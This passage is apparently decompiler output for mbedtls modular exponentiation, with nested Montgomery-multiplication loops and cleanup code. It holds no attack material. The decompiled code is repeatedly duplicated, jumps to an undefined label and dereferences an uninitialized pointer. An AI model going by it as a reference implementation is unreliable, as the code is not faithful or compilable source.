                                result = v76;
                                v67 = v29;
                                if (v76 == 0) {
                                    // 0x805979f
                                    v9 = 1;
                                    v33 = g5;
                                    // branch -> 0x80596d2
                                    // 0x80596d2
                                    v55 = (int32_t)a5;
                                    if (a5 != NULL) {
                                        // 0x80596dc
                                        if (*(int32_t *)(v55 + 8) != 0) {
                                            // 0x80596e9
                                            v38 = &v6;
                                            g5 = v38;
                                            g7 = v55;
                                            v75 = v38;
                                            // branch -> 0x80596fe
                                            // 0x80596fe
                                            memcpy((char *)g5, (char *)g7, 3);
                                            v56 = (int32_t *)v33;
                                            v41 = mbedtls_mpi_cmp_mpi(v56, (int32_t *)g3);
                                            g1 = v41;
                                            if (v41 < 0) {
                                                // 0x8059870
                                                g7 = v33;
                                                g5 = v26;
                                                v46 = mbedtls_mpi_copy((char *)&v25, v56);
                                                g1 = v46;
                                                if (v46 != 0) {
                                                    result = v46;
                                                    v67 = v29;
                                                    // 0x80594ff
                                                    v54 = v18;
                                                    if (v20 > v54) {
                                                        // 0x805950d
                                                        v59 = 12 * v54 - 1612 + g2;
                                                        int32_t v77 = v54; // 0x8059528
                                                        // branch -> 0x8059528
                                                        while (true) {
                                                            // 0x8059528
                                                            g3 = v59 + 12;
                                                            g1 = mbedtls_mpi_free((int32_t *)v59);
                                                            v60 = v77 + 1;
                                                            if (v20 <= v60) {
                                                                // 0x805953a
                                                                g1 = result;
                                                                // branch -> 0x8059540
                                                                // 0x8059540
                                                                g6 = v26;
                                                                g1 = mbedtls_mpi_free(&v25);
                                                                g4 = v67;
                                                                g1 = mbedtls_mpi_free((int32_t *)v67);
                                                                mbedtls_mpi_free((int32_t *)v31);
                                                                g1 = result;
                                                                if (a5 != NULL) {
                                                                    // 0x805957d
                                                                    if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                        // 0x80593be
                                                                        g3 = v2;
                                                                        g7 = v3;
                                                                        g5 = v4;
                                                                        return result;
                                                                    }
                                                                }
                                                                // 0x805958b
                                                                g6 = &v6;
                                                                mbedtls_mpi_free(&v6);
                                                                // branch -> 0x80593be
                                                                // 0x80593be
                                                                g3 = v2;
                                                                g7 = v3;
                                                                g5 = v4;
                                                                return result;
                                                            }
                                                          lab_0x8059528_24:
                                                            // 0x8059528
                                                            v59 = g3;
                                                            v77 = v60;
                                                            // branch -> 0x8059528
                                                        }
                                                    }
                                                    // 0x8059540
                                                    g6 = v26;
                                                    g1 = mbedtls_mpi_free(&v25);
                                                    g4 = v67;
                                                    g1 = mbedtls_mpi_free((int32_t *)v67);
                                                    mbedtls_mpi_free((int32_t *)v31);
                                                    g1 = result;
                                                    if (a5 != NULL) {
                                                        // 0x805957d
                                                        if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                            // 0x80593be
                                                            g3 = v2;
                                                            g7 = v3;
                                                            g5 = v4;
                                                            return result;
                                                        }
                                                    }
                                                    // 0x805958b
                                                    g6 = &v6;
                                                    mbedtls_mpi_free(&v6);
                                                    // branch -> 0x80593be
                                                    // 0x80593be
                                                    g3 = v2;
                                                    g7 = v3;
                                                    g5 = v4;
                                                    return result;
                                                }
                                                v52 = v51;
                                            } else {
                                                // 0x8059715
                                                v68 = g3;
                                                v42 = mbedtls_mpi_mod_mpi(v26, v33, v68);
                                                g1 = v42;
                                                if (v42 != 0) {
                                                    result = v42;
                                                    v67 = v29;
                                                    // 0x80594ff
                                                    v54 = v18;
                                                    if (v20 > v54) {
                                                        // 0x805950d
                                                        v59 = 12 * v54 - 1612 + g2;
                                                        // branch -> 0x8059528
                                                        while (true) {
                                                            // 0x8059528
                                                            g3 = v59 + 12;
                                                            g1 = mbedtls_mpi_free((int32_t *)v59);
                                                            v60 = v54 + 1;
                                                            if (v20 > v60) {
                                                                goto lab_0x8059528_24;
                                                            }
                                                            // 0x805953a
                                                            g1 = result;
                                                            // branch -> 0x8059540
                                                        }
                                                    }
                                                    // 0x8059540
                                                    g6 = v26;
                                                    g1 = mbedtls_mpi_free(&v25);
                                                    g4 = v67;
                                                    g1 = mbedtls_mpi_free((int32_t *)v67);
                                                    mbedtls_mpi_free((int32_t *)v31);
                                                    g1 = result;
                                                    if (a5 != NULL) {
                                                        // 0x805957d
                                                        if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                            // 0x80593be
                                                            g3 = v2;
                                                            g7 = v3;
                                                            g5 = v4;
                                                            return result;
                                                        }
                                                    }
                                                    // 0x805958b
                                                    g6 = &v6;
                                                    mbedtls_mpi_free(&v6);
                                                    // branch -> 0x80593be
                                                    // 0x80593be
                                                    g3 = v2;
                                                    g7 = v3;
                                                    g5 = v4;
                                                    return result;
                                                }
                                                v52 = v68;
                                            }
                                            // 0x8059736
                                            g4 = g3;
                                            g6 = v75;
                                            g1 = v26;
                                            v61 = -v16;
                                            g7 = v61;
                                            mpi_montmul((int64_t)v61, v29, v52, 0, 0);
                                            g5 = v75;
                                            v57 = v1;
                                            g1 = v57;
                                            v43 = mbedtls_mpi_copy((char *)v57, (int32_t *)v75);
                                            if (v43 == 0) {
                                                // 0x80597ae
                                                g1 = v1;
                                                v39 = &v53;
                                                g6 = v39;
                                                g4 = g3;
                                                v53 = 1;
                                                mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                if (v21 != 1) {
                                                    // 0x80597f0
                                                    v36 = (int32_t)(12 * v18) + v13;
                                                    g5 = v36;
                                                    v44 = mbedtls_mpi_grow(v36, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                    g1 = v44;
                                                    result = v44;
                                                    v67 = v29;
                                                    if (v44 == 0) {
                                                        // 0x8059819
                                                        g1 = v26;
                                                        v45 = mbedtls_mpi_copy((char *)g5, &v25);
                                                        g1 = v45;
                                                        if (v45 == 0) {
                                                            // 0x805983d
                                                            if (v19 != 0) {
                                                                g4 = g3;
                                                                v58 = g5;
                                                                g1 = v58;
                                                                g6 = v58;
                                                                mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                v34 = 1;
                                                                while (v34 < v19) {
                                                                    // 0x805984f
                                                                    g4 = g3;
                                                                    v58 = g5;
                                                                    g1 = v58;
                                                                    g6 = v58;
                                                                    mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                    v34++;
                                                                    // continue -> 0x805984f
                                                                }
                                                                // 0x80598fe
                                                                v35 = (int32_t)v18 + 1;
                                                                v37 = 12 * v35 + v13;
                                                                g5 = v37;
                                                                if (v35 < v20) {
                                                                    v62 = v37;
                                                                    v66 = v35;
                                                                    while (true) {
                                                                        // 0x8059926
                                                                        v50 = mbedtls_mpi_grow(v62, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                                        g1 = v50;
                                                                        result = v50;
                                                                        v67 = v29;
                                                                        if (v50 == 0) {
                                                                          lab_0x8059946_7:;
                                                                            int32_t v78 = g5; // 0x8059946
                                                                            int32_t v79 = v78 - 12; // 0x8059946
                                                                            g1 = v79;
                                                                            g5 = v78 + 12;
                                                                            int32_t v80 = mbedtls_mpi_copy((char *)v78, (int32_t *)v79); // 0x8059953
                                                                            g1 = v80;
                                                                            if (v80 == 0) {
                                                                                // 0x8059960
                                                                                g4 = g3;
                                                                                g6 = v26;
                                                                                g1 = v62;
                                                                                mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                                int32_t v81 = v66 + 1; // 0x8059980
                                                                                if (v81 < v20) {
                                                                                    // 0x8059960
                                                                                    v62 = g5;
                                                                                    v66 = v81;
                                                                                    // branch -> 0x8059926
                                                                                    continue;
                                                                                } else {
                                                                                    // 0x8059989
                                                                                    g5 = 0;
                                                                                    v65 = 0;
                                                                                    v74 = 0;
                                                                                    v64 = *(int32_t *)(a3 + 4);
                                                                                    v72 = 0;
                                                                                    // branch -> 0x80599b5
                                                                                    while (true) {
                                                                                        // 0x80599b5
                                                                                        v73 = v74;
                                                                                        v71 = v72;
                                                                                        v63 = v64;
                                                                                        // branch -> 0x80599b5
                                                                                      lab_0x80599b5_12:;
                                                                                        int32_t v82; // 0x8059a51
                                                                                        int32_t v83;
                                                                                        int32_t v84; // 0x80599eb93
                                                                                        while (true) {
                                                                                            // 0x80599b5
                                                                                            uint32_t v85; // 0x80599f4
                                                                                            int32_t v86; // 0x80599f6
                                                                                            int32_t v87; // 0x80599f1
                                                                                            if (v73 == 0) {
                                                                                                // 0x80599c2
                                                                                                if (v63 == 0) {
                                                                                                    // 0x8059af8
                                                                                                    int32_t v88; // 0x8059ba5
                                                                                                    int32_t v89;
                                                                                                    int32_t * v90;
                                                                                                    if (v65 == 0) {
                                                                                                        // 0x8059b4f
                                                                                                        g1 = v1;
                                                                                                        g6 = v39;
                                                                                                        g4 = g3;
                                                                                                        v53 = 1;
                                                                                                        mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                                                        if (v32 != -1) {
                                                                                                            // 0x805977d
                                                                                                            g1 = v43;
                                                                                                            result = v43;
                                                                                                            v67 = v29;
                                                                                                            // branch -> 0x80594ff
                                                                                                        } else {
                                                                                                            // 0x8059b91
                                                                                                            v89 = v1;
                                                                                                            g7 = v89;
                                                                                                            *(int32_t *)v89 = -1;
                                                                                                            v90 = (int32_t *)g7;
                                                                                                            v88 = mbedtls_mpi_add_mpi(v90, (int32_t *)g3, v90);
                                                                                                            g1 = v88;
                                                                                                            result = v88;
                                                                                                            v67 = v29;
                                                                                                            // branch -> 0x80594ff
                                                                                                        }
                                                                                                        // 0x80594ff
                                                                                                        v54 = v18;
                                                                                                        if (v20 > v54) {
                                                                                                            // 0x805950d
                                                                                                            v59 = 12 * v54 - 1612 + g2;
                                                                                                            // branch -> 0x8059528
                                                                                                            while (true) {
                                                                                                                // 0x8059528
                                                                                                                g3 = v59 + 12;
                                                                                                                g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                                                                v60 = v54 + 1;
                                                                                                                if (v20 > v60) {
                                                                                                                    goto lab_0x8059528_24;
                                                                                                                }
                                                                                                                // 0x805953a
                                                                                                                g1 = result;
                                                                                                                // branch -> 0x8059540
                                                                                                            }
                                                                                                        }
                                                                                                        // 0x8059540
                                                                                                        g6 = v26;
                                                                                                        g1 = mbedtls_mpi_free(&v25);
                                                                                                        g4 = v67;
                                                                                                        g1 = mbedtls_mpi_free((int32_t *)v67);
                                                                                                        mbedtls_mpi_free((int32_t *)v31);
                                                                                                        g1 = result;
                                                                                                        if (a5 != NULL) {
                                                                                                            // 0x805957d
                                                                                                            if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                                                                // 0x80593be
                                                                                                                g3 = v2;
                                                                                                                g7 = v3;
                                                                                                                g5 = v4;
                                                                                                                return result;
                                                                                                            }
                                                                                                        }
                                                                                                        // 0x805958b
                                                                                                        g6 = &v6;
                                                                                                        mbedtls_mpi_free(&v6);
                                                                                                        // branch -> 0x80593be
                                                                                                        // 0x80593be
                                                                                                        g3 = v2;
                                                                                                        g7 = v3;
                                                                                                        g5 = v4;
                                                                                                        return result;
                                                                                                    }
                                                                                                    int32_t v91 = 0;
                                                                                                    while (true) {
                                                                                                        // 0x8059b06
                                                                                                        g4 = g3;
                                                                                                        g5 *= 2;
                                                                                                        g6 = v1;
                                                                                                        g1 = v1;
                                                                                                        mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                                                        if (g5 != v20) {
                                                                                                            // 0x8059b29
                                                                                                            g6 = v26;
                                                                                                            g1 = v1;
                                                                                                            g4 = g3;
                                                                                                            mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                                                            // branch -> 0x8059b46
                                                                                                        }
                                                                                                        int32_t v92 = v91 + 1; // 0x8059b46
                                                                                                        if (v92 >= v65) {
                                                                                                            // break -> 0x8059b4f
                                                                                                            break;
                                                                                                        }
                                                                                                        v91 = v92;
                                                                                                        // continue -> 0x8059b06
                                                                                                    }
                                                                                                    // 0x8059b4f
                                                                                                    g1 = v1;
                                                                                                    g6 = v39;
                                                                                                    g4 = g3;
                                                                                                    v53 = 1;
                                                                                                    mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                                                    if (v32 != -1) {
                                                                                                        // 0x805977d
                                                                                                        g1 = v43;
                                                                                                        result = v43;
                                                                                                        v67 = v29;
                                                                                                        // branch -> 0x80594ff
                                                                                                    } else {
                                                                                                        // 0x8059b91
                                                                                                        v89 = v1;
                                                                                                        g7 = v89;
                                                                                                        *(int32_t *)v89 = -1;
                                                                                                        v90 = (int32_t *)g7;
                                                                                                        v88 = mbedtls_mpi_add_mpi(v90, (int32_t *)g3, v90);
                                                                                                        g1 = v88;
                                                                                                        result = v88;
                                                                                                        v67 = v29;
                                                                                                        // branch -> 0x80594ff
                                                                                                    }
                                                                                                    // 0x80594ff
                                                                                                    v54 = v18;
                                                                                                    if (v20 > v54) {
                                                                                                        // 0x805950d
                                                                                                        v59 = 12 * v54 - 1612 + g2;
                                                                                                        // branch -> 0x8059528
                                                                                                        while (true) {
                                                                                                            // 0x8059528
                                                                                                            g3 = v59 + 12;
                                                                                                            g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                                                            v60 = v54 + 1;
                                                                                                            if (v20 > v60) {
                                                                                                                goto lab_0x8059528_24;
                                                                                                            }
                                                                                                            // 0x805953a
                                                                                                            g1 = result;
                                                                                                            // branch -> 0x8059540
                                                                                                        }
                                                                                                    }
                                                                                                    // 0x8059540
                                                                                                    g6 = v26;
                                                                                                    g1 = mbedtls_mpi_free(&v25);
                                                                                                    g4 = v67;
                                                                                                    g1 = mbedtls_mpi_free((int32_t *)v67);
                                                                                                    mbedtls_mpi_free((int32_t *)v31);
                                                                                                    g1 = result;
                                                                                                    if (a5 != NULL) {
                                                                                                        // 0x805957d
                                                                                                        if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                                                            // 0x80593be
                                                                                                            g3 = v2;
                                                                                                            g7 = v3;
                                                                                                            g5 = v4;
                                                                                                            return result;
                                                                                                        }
                                                                                                    }
                                                                                                    // 0x805958b
                                                                                                    g6 = &v6;
                                                                                                    mbedtls_mpi_free(&v6);
                                                                                                    // branch -> 0x80593be
                                                                                                    // 0x80593be
                                                                                                    g3 = v2;
                                                                                                    g7 = v3;
                                                                                                    g5 = v4;
                                                                                                    return result;
                                                                                                }
                                                                                                // 0x80599cf
                                                                                                v83 = 31;
                                                                                                v84 = v63 - 1;
                                                                                                // branch -> 0x80599e5
                                                                                              lab_0x80599e5:
                                                                                                // 0x80599e5
                                                                                                v87 = *(int32_t *)(4 * v84 + *(int32_t *)(a3 + 8));
                                                                                                v85 = v83 % 32;
                                                                                                v86 = v87;
                                                                                                if (v85 != 0) {
                                                                                                  lab_if_80599f4_0_true:
                                                                                                    // if_80599f4_0_true
                                                                                                    v86 = v87 >> v85;
                                                                                                    // branch -> after_if_80599f4_0
                                                                                                }
                                                                                              lab_after_if_80599f4_0:;
                                                                                                int32_t v93 = v86 % 2; // 0x80599f6
                                                                                                if (v86 == 1) {
                                                                                                    // 0x8059ab6
                                                                                                    if (v71 != 0) {
                                                                                                        // break -> 0x8059ac3
                                                                                                        break;
                                                                                                    }
                                                                                                    v73 = v83;
                                                                                                    v71 = 0;
                                                                                                    v63 = v84;
                                                                                                    // continue -> 0x80599b5
                                                                                                    continue;
                                                                                                }
                                                                                                int32_t v94 = v65 + 1; // 0x80599ff
                                                                                                uint32_t v95 = (v21 - v94) % 32; // 0x8059a1c
                                                                                                int32_t v96 = v93; // 0x8059a1e
                                                                                                if (v95 != 0) {
                                                                                                    // if_8059a1c_0_true
                                                                                                    v96 = v93 << v95;
                                                                                                    // branch -> after_if_8059a1c_0
                                                                                                }
                                                                                                // after_if_8059a1c_0
                                                                                                g5 |= v96;
                                                                                                if (v21 == v94) {
                                                                                                    v82 = 0;
                                                                                                    // break (via goto) -> 0x8059a38
                                                                                                    goto lab_0x8059a38;
                                                                                                }
                                                                                                v65 = v94;
                                                                                                v74 = v83;
                                                                                                v64 = v84;
                                                                                                v72 = 2;
                                                                                                // continue (via goto) -> 0x80599b5
                                                                                                goto lab_0x80599b5_13;
                                                                                            } else {
                                                                                                // 0x8059aa4
                                                                                                v83 = v73 - 1;
                                                                                                v84 = v63;
                                                                                                // branch -> 0x80599e5
                                                                                                goto lab_0x80599e5;
                                                                                            }
                                                                                            // 0x80599e5
                                                                                            int32_t * v97; // 0x80599e8_0
                                                                                            int32_t v98 = *v97; // 0x80599e8
                                                                                            v87 = *(int32_t *)(4 * v84 + v98);
                                                                                            v85 = v83 % 32;
                                                                                            if (v85 == 0) {
                                                                                                v86 = v87;
                                                                                                goto lab_after_if_80599f4_0;
                                                                                            }
                                                                                            goto lab_if_80599f4_0_true;
                                                                                        }
                                                                                      lab_0x8059a38:
                                                                                        while (true) {
                                                                                            // 0x8059a38
                                                                                            g4 = g3;
                                                                                            g6 = v1;
                                                                                            g1 = v1;
                                                                                            mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                                            v82++;
                                                                                            if (v21 <= v82) {
                                                                                                // break -> 0x8059a66
                                                                                                break;
                                                                                            }
                                                                                            // continue -> 0x8059a38
                                                                                        }
                                                                                        // 0x8059a66
                                                                                        g4 = g3;
                                                                                        g1 = v1;
                                                                                        g6 = 12 * g5 + v13;
                                                                                        g5 = v15;
                                                                                        mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                                        v65 = 0;
                                                                                        v74 = v83;
                                                                                        v64 = v84;
                                                                                        v72 = 1;
                                                                                        // branch -> 0x80599b5
                                                                                    }
                                                                                }
                                                                            } else {
                                                                                result = v80;
                                                                                v67 = v29;
                                                                            }
                                                                        }
                                                                        // 0x80594ff
                                                                        v54 = v18;
                                                                        if (v20 > v54) {
                                                                            // 0x805950d
                                                                            v59 = 12 * v54 - 1612 + g2;
                                                                            // branch -> 0x8059528
                                                                            while (true) {
                                                                                // 0x8059528
                                                                                g3 = v59 + 12;
                                                                                g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                                v60 = v54 + 1;
                                                                                if (v20 > v60) {
                                                                                    goto lab_0x8059528_24;
                                                                                }
                                                                                // 0x805953a
                                                                                g1 = result;
                                                                                // branch -> 0x8059540
                                                                            }
                                                                        }
                                                                        // 0x8059540
                                                                        g6 = v26;
                                                                        g1 = mbedtls_mpi_free(&v25);
                                                                        g4 = v67;
                                                                        g1 = mbedtls_mpi_free((int32_t *)v67);
                                                                        mbedtls_mpi_free((int32_t *)v31);
                                                                        g1 = result;
                                                                        if (a5 != NULL) {
                                                                            // 0x805957d
                                                                            if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                                // 0x80593be
                                                                                g3 = v2;
                                                                                g7 = v3;
                                                                                g5 = v4;
                                                                                return result;
                                                                            }
                                                                        }
                                                                        // 0x805958b
                                                                        g6 = &v6;
                                                                        mbedtls_mpi_free(&v6);
                                                                        // branch -> 0x80593be
                                                                        // 0x80593be
                                                                        g3 = v2;
                                                                        g7 = v3;
                                                                        g5 = v4;
                                                                        return result;
                                                                    }
                                                                }
                                                                // 0x8059989
                                                                g5 = 0;
                                                                v65 = 0;
                                                                // branch -> 0x80599b5
                                                                while (true) {
                                                                    // 0x80599b5
                                                                    v73 = 0;
                                                                    v71 = 0;
                                                                    v63 = *(int32_t *)(a3 + 4);
                                                                    // branch -> 0x80599b5
                                                                    goto lab_0x80599b5_12;
                                                                }
                                                            }
                                                            // 0x80598fe
                                                            v35 = (int32_t)v18 + 1;
                                                            v37 = 12 * v35 + v13;
                                                            g5 = v37;
                                                            if (v35 < v20) {
                                                                v62 = v37;
                                                                v66 = v35;
                                                                while (true) {
                                                                    // 0x8059926
                                                                    v50 = mbedtls_mpi_grow(v62, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                                    g1 = v50;
                                                                    if (v50 == 0) {
                                                                        goto lab_0x8059946_7;
                                                                    }
                                                                    result = v50;
                                                                    v67 = v29;
                                                                    // 0x80594ff
                                                                    v54 = v18;
                                                                    if (v20 > v54) {
                                                                        // 0x805950d
                                                                        v59 = 12 * v54 - 1612 + g2;
                                                                        // branch -> 0x8059528
                                                                        while (true) {
                                                                            // 0x8059528
                                                                            g3 = v59 + 12;
                                                                            g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                            v60 = v54 + 1;
                                                                            if (v20 > v60) {
                                                                                goto lab_0x8059528_24;
                                                                            }
                                                                            // 0x805953a
                                                                            g1 = result;
                                                                            // branch -> 0x8059540
                                                                        }
                                                                    }
                                                                    // 0x8059540
                                                                    g6 = v26;
                                                                    g1 = mbedtls_mpi_free(&v25);
                                                                    g4 = v67;
                                                                    g1 = mbedtls_mpi_free((int32_t *)v67);
                                                                    mbedtls_mpi_free((int32_t *)v31);
                                                                    g1 = result;
                                                                    if (a5 != NULL) {
                                                                        // 0x805957d
                                                                        if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                            // 0x80593be
                                                                            g3 = v2;
                                                                            g7 = v3;
                                                                            g5 = v4;
                                                                            return result;
                                                                        }
                                                                    }
                                                                    // 0x805958b
                                                                    g6 = &v6;
                                                                    mbedtls_mpi_free(&v6);
                                                                    // branch -> 0x80593be
                                                                    // 0x80593be
                                                                    g3 = v2;
                                                                    g7 = v3;
                                                                    g5 = v4;
                                                                    return result;
                                                                }
                                                            }
                                                            // 0x8059989
                                                            g5 = 0;
                                                            v65 = 0;
                                                            // branch -> 0x80599b5
                                                            while (true) {
                                                                // 0x80599b5
                                                                v73 = 0;
                                                                v71 = 0;
                                                                v63 = *(int32_t *)(a3 + 4);
                                                                // branch -> 0x80599b5
                                                                goto lab_0x80599b5_12;
                                                            }
                                                        } else {
                                                            result = v45;
                                                            v67 = v29;
                                                        }
                                                    }
                                                    // 0x80594ff
                                                    v54 = v18;
                                                    if (v20 > v54) {
                                                        // 0x805950d
                                                        v59 = 12 * v54 - 1612 + g2;
                                                        // branch -> 0x8059528
                                                        while (true) {
                                                            // 0x8059528
                                                            g3 = v59 + 12;
                                                            g1 = mbedtls_mpi_free((int32_t *)v59);
                                                            v60 = v54 + 1;
                                                            if (v20 > v60) {
                                                                goto lab_0x8059528_24;
                                                            }
                                                            // 0x805953a
                                                            g1 = result;
                                                            // branch -> 0x8059540
                                                        }
                                                    }
                                                    // 0x8059540
                                                    g6 = v26;
                                                    g1 = mbedtls_mpi_free(&v25);
                                                    g4 = v67;
                                                    g1 = mbedtls_mpi_free((int32_t *)v67);
                                                    mbedtls_mpi_free((int32_t *)v31);
                                                    g1 = result;
                                                    if (a5 != NULL) {
                                                        // 0x805957d
                                                        if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                            // 0x80593be
                                                            g3 = v2;
                                                            g7 = v3;
                                                            g5 = v4;
                                                            return result;
                                                        }
                                                    }
                                                    // 0x805958b
                                                    g6 = &v6;
                                                    mbedtls_mpi_free(&v6);
                                                    // branch -> 0x80593be
                                                    // 0x80593be
                                                    g3 = v2;
                                                    g7 = v3;
                                                    g5 = v4;
                                                    return result;
                                                }
                                                // 0x8059989
                                                g5 = 0;
                                                v65 = 0;
                                                // branch -> 0x80599b5
                                                while (true) {
                                                    // 0x80599b5
                                                    v73 = 0;
                                                    v71 = 0;
                                                    v63 = *(int32_t *)(a3 + 4);
                                                    // branch -> 0x80599b5
                                                    goto lab_0x80599b5_12;
                                                }
                                            } else {
                                                // 0x805977d
                                                g1 = v43;
                                                result = v43;
                                                v67 = v29;
                                                // branch -> 0x80594ff
                                            }
                                            // 0x80594ff
                                            v54 = v18;
                                            if (v20 > v54) {
                                                // 0x805950d
                                                v59 = 12 * v54 - 1612 + g2;
                                                // branch -> 0x8059528
                                                while (true) {
                                                    // 0x8059528
                                                    g3 = v59 + 12;
                                                    g1 = mbedtls_mpi_free((int32_t *)v59);
                                                    v60 = v54 + 1;
                                                    if (v20 > v60) {
                                                        goto lab_0x8059528_24;
                                                    }
                                                    // 0x805953a
                                                    g1 = result;
                                                    // branch -> 0x8059540
                                                }
                                            }
                                            // 0x8059540
                                            g6 = v26;
                                            g1 = mbedtls_mpi_free(&v25);
                                            g4 = v67;
                                            g1 = mbedtls_mpi_free((int32_t *)v67);
                                            mbedtls_mpi_free((int32_t *)v31);
                                            g1 = result;
                                            if (a5 != NULL) {
                                                // 0x805957d
                                                if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                    // 0x80593be
                                                    g3 = v2;
                                                    g7 = v3;
                                                    g5 = v4;
                                                    return result;
                                                }
                                            }
                                            // 0x805958b
                                            g6 = &v6;
                                            mbedtls_mpi_free(&v6);
                                            // branch -> 0x80593be
                                            // 0x80593be
                                            g3 = v2;
                                            g7 = v3;
                                            g5 = v4;
                                            return result;
                                        }
                                    }
                                    // 0x8059892
                                    v40 = &v6;
                                    g7 = v40;
                                    v47 = mbedtls_mpi_lset((char *)&v6, 1);
                                    g1 = v47;
                                    if (v47 == 0) {
                                        // 0x80598b3
                                        v48 = mbedtls_mpi_shift_l(g7, 64 * *(int32_t *)(g3 + 4));
                                        g1 = v48;
                                        if (v48 == 0) {
                                            // 0x80598cd
                                            v69 = g3;
                                            v70 = g7;
                                            v49 = mbedtls_mpi_mod_mpi(v70, v70, v69);
                                            g1 = v49;
                                            if (v49 == 0) {
                                                // 0x80598e5
                                                if (a5 == NULL) {
                                                    // 0x80598e5
                                                    dest_mem = g4;
                                                    v75 = v40;
                                                    // branch -> 0x80596fe
                                                } else {
                                                    // 0x80598ef
                                                    g5 = v55;
                                                    dest_mem = (int32_t)memcpy(a5, (char *)g7, 3);
                                                    v75 = v40;
                                                    // branch -> 0x80596fe
                                                }
                                                // 0x80596fe
                                                memcpy((char *)g5, (char *)g7, dest_mem);
                                                v56 = (int32_t *)v33;
                                                v41 = mbedtls_mpi_cmp_mpi(v56, (int32_t *)g3);
                                                g1 = v41;
                                                if (v41 < 0) {
                                                    // 0x8059870
                                                    g7 = v33;
                                                    g5 = v26;
                                                    v46 = mbedtls_mpi_copy((char *)&v25, v56);
                                                    g1 = v46;
                                                    if (v46 != 0) {
                                                        result = v46;
                                                        v67 = v29;
                                                        // 0x80594ff
                                                        v54 = v18;
                                                        if (v20 > v54) {
                                                            // 0x805950d
                                                            v59 = 12 * v54 - 1612 + g2;
                                                            // branch -> 0x8059528
                                                            while (true) {
                                                                // 0x8059528
                                                                g3 = v59 + 12;
                                                                g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                v60 = v54 + 1;
                                                                if (v20 > v60) {
                                                                    goto lab_0x8059528_24;
                                                                }
                                                                // 0x805953a
                                                                g1 = result;
                                                                // branch -> 0x8059540
                                                            }
                                                        }
                                                        // 0x8059540
                                                        g6 = v26;
                                                        g1 = mbedtls_mpi_free(&v25);
                                                        g4 = v67;
                                                        g1 = mbedtls_mpi_free((int32_t *)v67);
                                                        mbedtls_mpi_free((int32_t *)v31);
                                                        g1 = result;
                                                        if (a5 != NULL) {
                                                            // 0x805957d
                                                            if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                // 0x80593be
                                                                g3 = v2;
                                                                g7 = v3;
                                                                g5 = v4;
                                                                return result;
                                                            }
                                                        }
                                                        // 0x805958b
                                                        g6 = &v6;
                                                        mbedtls_mpi_free(&v6);
                                                        // branch -> 0x80593be
                                                        // 0x80593be
                                                        g3 = v2;
                                                        g7 = v3;
                                                        g5 = v4;
                                                        return result;
                                                    }
                                                    v52 = v69;
                                                } else {
                                                    // 0x8059715
                                                    v68 = g3;
                                                    v42 = mbedtls_mpi_mod_mpi(v26, v33, v68);
                                                    g1 = v42;
                                                    if (v42 != 0) {
                                                        result = v42;
                                                        v67 = v29;
                                                        // 0x80594ff
                                                        v54 = v18;
                                                        if (v20 > v54) {
                                                            // 0x805950d
                                                            v59 = 12 * v54 - 1612 + g2;
                                                            // branch -> 0x8059528
                                                            while (true) {
                                                                // 0x8059528
                                                                g3 = v59 + 12;
                                                                g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                v60 = v54 + 1;
                                                                if (v20 > v60) {
                                                                    goto lab_0x8059528_24;
                                                                }
                                                                // 0x805953a
                                                                g1 = result;
                                                                // branch -> 0x8059540
                                                            }
                                                        }
                                                        // 0x8059540
                                                        g6 = v26;
                                                        g1 = mbedtls_mpi_free(&v25);
                                                        g4 = v67;
                                                        g1 = mbedtls_mpi_free((int32_t *)v67);
                                                        mbedtls_mpi_free((int32_t *)v31);
                                                        g1 = result;
                                                        if (a5 != NULL) {
                                                            // 0x805957d
                                                            if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                // 0x80593be
                                                                g3 = v2;
                                                                g7 = v3;
                                                                g5 = v4;
                                                                return result;
                                                            }
                                                        }
                                                        // 0x805958b
                                                        g6 = &v6;
                                                        mbedtls_mpi_free(&v6);
                                                        // branch -> 0x80593be
                                                        // 0x80593be
                                                        g3 = v2;
                                                        g7 = v3;
                                                        g5 = v4;
                                                        return result;
                                                    }
                                                    v52 = v68;
                                                }
                                                // 0x8059736
                                                g4 = g3;
                                                g6 = v75;
                                                g1 = v26;
                                                v61 = -v16;
                                                g7 = v61;
                                                mpi_montmul((int64_t)v61, v29, v52, 0, 0);
                                                g5 = v75;
                                                v57 = v1;
                                                g1 = v57;
                                                v43 = mbedtls_mpi_copy((char *)v57, (int32_t *)v75);
                                                if (v43 == 0) {
                                                    // 0x80597ae
                                                    g1 = v1;
                                                    v39 = &v53;
                                                    g6 = v39;
                                                    g4 = g3;
                                                    v53 = 1;
                                                    mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                    if (v21 != 1) {
                                                        // 0x80597f0
                                                        v36 = (int32_t)(12 * v18) + v13;
                                                        g5 = v36;
                                                        v44 = mbedtls_mpi_grow(v36, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                        g1 = v44;
                                                        result = v44;
                                                        v67 = v29;
                                                        if (v44 == 0) {
                                                            // 0x8059819
                                                            g1 = v26;
